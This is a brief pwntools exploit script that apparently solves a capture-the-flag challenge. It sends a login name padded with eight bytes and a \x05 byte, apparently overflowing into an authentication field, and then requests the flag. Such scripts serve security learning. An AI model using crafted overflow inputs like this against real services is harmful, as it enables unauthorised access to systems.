#!/usr/bin/env python3 

from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc-2.23.so')

p = elf.process()

# p = process('./auth', env={"LD_PRELOAD":"./libc-2.23.so"})

gdb.attach(p, '''

''')

username = b"login " + b"0"*8 + b"\x05"

p.sendline(username)

p.sendline(b"reset")

p.sendline(b"login nigma")

p.sendline(b"get-flag")

p.interactive()


